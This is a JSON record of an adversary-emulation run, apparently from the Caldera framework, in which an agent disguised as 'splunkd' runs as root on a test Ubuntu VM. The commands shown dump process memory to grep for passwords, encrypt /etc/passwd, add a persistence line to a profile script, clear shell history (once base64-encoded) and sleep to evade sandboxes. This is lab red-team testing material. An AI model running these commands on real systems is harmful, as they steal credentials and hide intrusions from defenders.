{"visibility": 50, "adversary": {"objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc", "name": "prueba", "atomic_ordering": ["26d3702887944abcc64b406baf8f8e43", "10a9d979-e342-418a-a9b0-002c483e0fa6", "0672185d22612c95792d39efab04ba17", "0739c2e7c60bf7703b36a4f8f3480ccc", "2966a5fc825f509f4adff7b855e26574", "36eecb80-ede3-442b-8774-956e906aff02", "10fad81e-3f68-47be-83b6-fbee7711c6a9", "4e97e699-93d7-4040-b5a3-2e906a58199e", "300157e5-f4ad-4569-b533-9d1fa0e74d74", "ea713bc4-63f0-491c-9a6f-0b01d560b87e"], "plugin": "stockpile", "description": "Description of the APT", "tags": [], "has_repeatable_abilities": false, "adversary_id": "729486a5-8076-4cbe-8031-cb8446f81234"}, "name": "Operation_PRUEBA 2.0", "planner": {"name": "atomic", "plugin": "stockpile", "ignore_enforcement_modules": [], "description": "During each phase of the operation, the atomic planner iterates through each agent and sends the next\navailable ability it thinks that agent can complete. This decision is based on the agent matching the operating\nsystem (execution platform) of the ability and the ability command having no unsatisfied variables.\nThe planner then waits for each agent to complete its command before determining the subsequent abilities.\nThe abilities are processed in the order set by each agent's atomic ordering.\nFor instance, if agent A has atomic ordering (A1, A2, A3) and agent B has atomic ordering (B1, B2, B3), then\nthe planner would send (A1, B1) in the first phase, then (A2, B2), etc.\n", "id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a", "stopping_conditions": [], "params": {}, "module": "plugins.stockpile.app.atomic", "allow_repeatable_abilities": false}, "start": "2023-07-05T07:25:49Z", "obfuscator": "plain-text", "objective": {"name": "default", "description": "This is a default objective that runs forever.", "goals": [{"target": "exhaustion", "achieved": false, "value": "complete", "operator": "==", "count": 1048576}], "percentage": 0.0, "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc"}, "use_learning_parsers": false, "group": "", "source": {"name": "basic", "plugin": "stockpile", "relationships": [], "facts": [{"name": "file.sensitive.extension", "relationships": [], "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "trait": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "value": "wav", "links": [], "limit_count": -1, "unique": "file.sensitive.extensionwav", "created": "2023-05-23T08:08:19Z", "collected_by": [], "score": 1}, {"name": "file.sensitive.extension", "relationships": [], "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "trait": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "value": "yml", "links": [], "limit_count": -1, "unique": "file.sensitive.extensionyml", "created": "2023-05-23T08:08:19Z", "collected_by": [], "score": 1}, {"name": "file.sensitive.extension", "relationships": [], "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "trait": "file.sensitive.extension", "technique_id": null, "origin_type": "SEEDED", "value": "png", "links": [], "limit_count": -1, "unique": "file.sensitive.extensionpng", "created": "2023-05-23T08:08:19Z", "collected_by": [], "score": 1}, {"name": "server.malicious.url", "relationships": [], "source": "ed32b9c3-9593-4c33-b0db-e2007315096b", "trait": "server.malicious.url", "technique_id": null, "origin_type": "SEEDED", "value": "keyloggedsite.com", "links": [], "limit_count": -1, "unique": "server.malicious.urlkeyloggedsite.com", "created": "2023-05-23T08:08:19Z", "collected_by": [], "score": 1}], "rules": [{"match": ".*", "trait": "file.sensitive.extension", "action": "DENY"}, {"match": "png", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "yml", "trait": "file.sensitive.extension", "action": "ALLOW"}, {"match": "wav", "trait": "file.sensitive.extension", "action": "ALLOW"}], "adjustments": [{"ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "value": "symantec", "trait": "host.installed.av", "offset": 3}, {"ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "value": "mcafee", "trait": "host.installed.av", "offset": 3}], "id": "ed32b9c3-9593-4c33-b0db-e2007315096b"}, "jitter": "2/8", "chain": [{"visibility": {"adjustments": [], "score": 50}, "finish": "2023-07-05T07:25:50Z", "collect": "2023-07-05T07:25:50Z", "unique": "28cf8186-da0c-4570-93cd-9cabbd3034e7", "output": "True", "used": [], "executor": {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "groups; id"}, "cleanup": 0, "status": 0, "id": "28cf8186-da0c-4570-93cd-9cabbd3034e7", "deadman": false, "relationships": [], "host": "ubuntu-VirtualBox", "facts": [], "agent_reported_time": "2023-07-05T07:25:50Z", "pin": 0, "ability": {"name": "Enumerate users and groups", "privilege": null, "singleton": false, "description": "Utilize groups and id to enumerate users and groups\n", "plugin": "atomic", "requirements": [], "technique_id": "T1087.001", "ability_id": "26d3702887944abcc64b406baf8f8e43", "executors": [{"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "darwin", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "groups; id"}, {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "groups; id"}], "additional_info": {}, "tactic": "discovery", "delete_payload": true, "repeatable": false, "buckets": ["discovery"], "technique_name": "Account Discovery: Local Account", "access": {}}, "pid": "3003", "decide": "2023-07-05T07:25:49Z", "plaintext_command": "groups; id", "score": 0, "paw": "fdtcpy", "command": "groups; id"}, {"visibility": {"adjustments": [], "score": 50}, "finish": "2023-07-05T07:26:09Z", "collect": "2023-07-05T07:26:09Z", "unique": "7b59dfb9-655c-4d79-9769-fcb1f5978a27", "output": "True", "used": [], "executor": {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": ["$which_7z e /tmp/passwd.zip; rm /tmp/passwd.zip"], "build_target": null, "parsers": [], "command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd"}, "cleanup": 0, "status": 1, "id": "7b59dfb9-655c-4d79-9769-fcb1f5978a27", "deadman": false, "relationships": [], "host": "ubuntu-VirtualBox", "facts": [], "agent_reported_time": "2023-07-05T07:26:09Z", "pin": 0, "ability": {"name": "Encrypt files using 7z (Linux)", "privilege": null, "singleton": false, "description": "Uses 7z to encrypt a file\n", "plugin": "atomic", "requirements": [], "technique_id": "T1486", "ability_id": "0672185d22612c95792d39efab04ba17", "executors": [{"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": ["$which_7z e /tmp/passwd.zip; rm /tmp/passwd.zip"], "build_target": null, "parsers": [], "command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd"}], "additional_info": {}, "tactic": "impact", "delete_payload": true, "repeatable": false, "buckets": ["impact"], "technique_name": "Data Encrypted for Impact", "access": {}}, "pid": "3006", "decide": "2023-07-05T07:25:54Z", "plaintext_command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd", "score": 0, "paw": "fdtcpy", "command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd"}, {"visibility": {"adjustments": [], "score": 50}, "finish": "2023-07-05T07:26:29Z", "collect": "2023-07-05T07:26:29Z", "unique": "d4de8b1e-53d2-468f-83f6-1dfceaabb58e", "output": "False", "used": [], "executor": {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": ["sed -i \"s/# Atomic Red Team was here... T1546.004//\" /etc/profile.d/bash_completion.sh"], "build_target": null, "parsers": [], "command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh"}, "cleanup": 0, "status": 0, "id": "d4de8b1e-53d2-468f-83f6-1dfceaabb58e", "deadman": false, "relationships": [], "host": "ubuntu-VirtualBox", "facts": [], "agent_reported_time": "2023-07-05T07:26:29Z", "pin": 0, "ability": {"name": "System shell profile scripts", "privilege": null, "singleton": false, "description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n", "plugin": "atomic", "requirements": [], "technique_id": "T1546.004", "ability_id": "0739c2e7c60bf7703b36a4f8f3480ccc", "executors": [{"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": ["sed -i \"s/# Atomic Red Team was here... T1546.004//\" /etc/profile.d/bash_completion.sh"], "build_target": null, "parsers": [], "command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh"}], "additional_info": {}, "tactic": "multiple", "delete_payload": true, "repeatable": false, "buckets": ["multiple"], "technique_name": "Event Triggered Execution: .bash_profile and .bashrc", "access": {}}, "pid": "3007", "decide": "2023-07-05T07:26:14Z", "plaintext_command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh", "score": 0, "paw": "fdtcpy", "command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh"}, {"visibility": {"adjustments": [], "score": 50}, "finish": "2023-07-05T07:26:49Z", "collect": "2023-07-05T07:26:49Z", "unique": "606cf5e7-4258-4444-86f7-c2d2fd526139", "output": "True", "used": [], "executor": {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": ["rm -f \"/tmp/T1003.007.bin\""], "build_target": null, "parsers": [], "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1); MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))); MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))); MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))); dd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"; grep -i \"PASS\" \"/tmp/T1003.007.bin\""}, "cleanup": 0, "status": 0, "id": "606cf5e7-4258-4444-86f7-c2d2fd526139", "deadman": false, "relationships": [], "host": "ubuntu-VirtualBox", "facts": [], "agent_reported_time": "2023-07-05T07:26:49Z", "pin": 0, "ability": {"name": "Dump individual process memory with sh (Local)", "privilege": null, "singleton": false, "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n", "plugin": "atomic", "requirements": [], "technique_id": "T1003.007", "ability_id": "2966a5fc825f509f4adff7b855e26574", "executors": [{"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": ["rm -f \"/tmp/T1003.007.bin\""], "build_target": null, "parsers": [], "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1); MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))); MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))); MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))); dd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"; grep -i \"PASS\" \"/tmp/T1003.007.bin\""}], "additional_info": {}, "tactic": "credential-access", "delete_payload": true, "repeatable": false, "buckets": ["credential-access"], "technique_name": "OS Credential Dumping: Proc Filesystem", "access": {}}, "pid": "3008", "decide": "2023-07-05T07:26:34Z", "plaintext_command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1); MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))); MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))); MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))); dd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"; grep -i \"PASS\" \"/tmp/T1003.007.bin\"", "score": 0, "paw": "fdtcpy", "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1); MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))); MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))); MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))); dd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"; grep -i \"PASS\" \"/tmp/T1003.007.bin\""}, {"visibility": {"adjustments": [], "score": 50}, "finish": null, "collect": "2023-07-05T07:27:10Z", "unique": "ba462970-eb18-4782-a814-d41afe529759", "output": "False", "used": [], "executor": {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "sleep 60"}, "cleanup": 0, "status": -3, "id": "ba462970-eb18-4782-a814-d41afe529759", "deadman": false, "relationships": [], "host": "ubuntu-VirtualBox", "facts": [], "pin": 0, "ability": {"name": "1-min sleep", "privilege": null, "singleton": false, "description": "Pause all operations to avoid making noise", "plugin": "stockpile", "requirements": [], "technique_id": "T1497.003", "ability_id": "36eecb80-ede3-442b-8774-956e906aff02", "executors": [{"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "darwin", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "sleep 60"}, {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "sleep 60"}, {"language": null, "name": "psh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "windows", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "sleep 60"}], "additional_info": {}, "tactic": "defense-evasion", "delete_payload": true, "repeatable": false, "buckets": ["defense-evasion"], "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion", "access": {}}, "pid": null, "decide": "2023-07-05T07:26:54Z", "plaintext_command": "sleep 60", "score": 0, "paw": "fdtcpy", "command": "sleep 60"}], "host_group": [{"privilege": "Elevated", "proxy_receivers": {}, "sleep_max": 2, "links": [{"collect": "2023-07-05T07:24:23Z", "output": "False", "cleanup": 0, "id": "a7fb6c2e-7e15-48e9-bb76-3ed44c4af6c2", "deadman": false, "relationships": [], "host": "ubuntu-VirtualBox", "pid": "2974", "decide": "2023-07-05T07:24:23Z", "paw": "fdtcpy", "visibility": {"adjustments": [], "score": 50}, "finish": "2023-07-05T07:24:23Z", "unique": "a7fb6c2e-7e15-48e9-bb76-3ed44c4af6c2", "used": [], "executor": {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "> $HOME/.bash_history && unset HISTFILE"}, "status": 0, "facts": [], "agent_reported_time": "2023-07-05T07:24:23Z", "jitter": 0, "pin": 0, "ability": {"name": "Avoid logs", "privilege": null, "singleton": false, "description": "Stop terminal from logging history", "plugin": "stockpile", "requirements": [], "technique_id": "T1070.003", "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a", "executors": [{"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "darwin", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "> $HOME/.bash_history && unset HISTFILE"}, {"language": null, "name": "sh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "linux", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "> $HOME/.bash_history && unset HISTFILE"}, {"language": null, "name": "psh", "timeout": 60, "additional_info": {}, "variations": [], "platform": "windows", "payloads": [], "uploads": [], "code": null, "cleanup": [], "build_target": null, "parsers": [], "command": "Clear-History;Clear"}], "additional_info": {}, "tactic": "defense-evasion", "delete_payload": true, "repeatable": false, "buckets": ["defense-evasion"], "technique_name": "Indicator Removal on Host: Clear Command History", "access": {}}, "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF", "score": 0, "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF"}], "contact": "HTTP", "ppid": 2966, "deadman_enabled": true, "watchdog": 0, "username": "root", "architecture": "amd64", "executors": ["proc", "sh"], "host": "ubuntu-VirtualBox", "pid": 2969, "exe_name": "splunkd", "proxy_chain": [], "paw": "fdtcpy", "group": "red", "upstream_dest": "http://10.0.2.8:8888", "host_ip_addrs": ["10.0.2.15"], "sleep_min": 0, "created": "2023-07-05T07:24:23Z", "trusted": true, "server": "http://10.0.2.8:8888", "origin_link_id": "", "available_contacts": ["HTTP"], "location": "/home/ubuntu/Agent/splunkd", "platform": "linux", "last_seen": "2023-07-05T07:27:48Z", "display_name": "ubuntu-VirtualBox$root", "pending_contact": "HTTP"}], "state": "run_one_link", "auto_close": true, "autonomous": 1, "id": "bfa8d059-35c7-45d5-a829-3ab2fb630c68"}